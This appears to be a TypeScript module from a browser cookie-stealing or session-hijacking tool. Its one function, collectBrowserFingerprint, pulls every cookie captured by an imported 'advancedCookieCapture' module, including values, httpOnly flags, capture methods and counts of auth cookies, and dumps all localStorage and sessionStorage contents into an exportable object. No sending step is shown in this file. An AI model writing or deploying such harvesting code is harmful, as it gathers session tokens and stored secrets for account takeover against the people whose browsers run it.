import { advancedCookieCapture, CapturedCookie } from './advancedCookieCapture';

export interface BrowserFingerprint {
  cookies: any[];
  localStorage: string;
  sessionStorage: string;
  userAgent: string;
  language: string;
  platform: string;
  cookieEnabled: boolean;
  cookieStats?: any;
}

export function collectBrowserFingerprint(): BrowserFingerprint {
  // Check if we're in a browser environment
  if (typeof window === 'undefined') {
    return {
      cookies: [],
      localStorage: 'Not available (server-side)',
      sessionStorage: 'Not available (server-side)',
      userAgent: 'Server-side',
      language: 'en-US',
      platform: 'Server',
      cookieEnabled: false,
      cookieStats: { total: 0, byMethod: {}, byDomain: {}, authCookies: 0 }
    };
  }
  
  // Use advanced cookie capture system
  const capturedCookies = advancedCookieCapture.getAllCookies();
  
  try {
    // Convert captured cookies to the expected format
    const cookies = capturedCookies.map(cookie => ({
      name: cookie.name,
      value: cookie.value,
      domain: cookie.domain,
      expirationDate: cookie.expirationDate,
      hostOnly: cookie.hostOnly,
      httpOnly: cookie.httpOnly,
      path: cookie.path,
      sameSite: cookie.sameSite,
      secure: cookie.secure,
      session: cookie.session,
      storeId: cookie.storeId,
      captureMethod: cookie.captureMethod,
      timestamp: cookie.timestamp
    }));

    // Get localStorage data
    let localStorageData = 'Empty';
    try {
      const localData: { [key: string]: string } = {};
      for (let i = 0; i < window.localStorage.length; i++) {
        const key = window.localStorage.key(i);
        if (key) {
          localData[key] = window.localStorage.getItem(key) || '';
        }
      }
      localStorageData = Object.keys(localData).length > 0 ? JSON.stringify(localData) : 'Empty';
    } catch (e) {
      localStorageData = 'Access denied';
    }

    // Get sessionStorage data
    let sessionStorageData = 'Empty';
    try {
      const sessionData: { [key: string]: string } = {};
      for (let i = 0; i < window.sessionStorage.length; i++) {
        const key = window.sessionStorage.key(i);
        if (key) {
          sessionData[key] = window.sessionStorage.getItem(key) || '';
        }
      }
      sessionStorageData = Object.keys(sessionData).length > 0 ? JSON.stringify(sessionData) : 'Empty';
    } catch (e) {
      sessionStorageData = 'Access denied';
    }

    return {
      cookies,
      localStorage: localStorageData,
      sessionStorage: sessionStorageData,
      userAgent: navigator.userAgent,
      language: navigator.language,
      platform: navigator.platform,
      cookieEnabled: navigator.cookieEnabled,
      cookieStats: advancedCookieCapture.getStats()
    };
  } catch (error) {
    console.error('Error collecting browser fingerprint:', error);
    return {
      cookies: capturedCookies.map(cookie => ({
        name: cookie.name,
        value: cookie.value,
        domain: cookie.domain,
        expirationDate: cookie.expirationDate,
        hostOnly: cookie.hostOnly,
        httpOnly: cookie.httpOnly,
        path: cookie.path,
        sameSite: cookie.sameSite,
        secure: cookie.secure,
        session: cookie.session,
        storeId: cookie.storeId,
        captureMethod: cookie.captureMethod,
        timestamp: cookie.timestamp
      })),
      localStorage: 'Error accessing localStorage',
      sessionStorage: 'Error accessing sessionStorage',
      userAgent: navigator.userAgent || 'Unknown',
      language: navigator.language || 'Unknown',
      platform: navigator.platform || 'Unknown',
      cookieEnabled: navigator.cookieEnabled || false,
      cookieStats: advancedCookieCapture.getStats()
    };
  }
}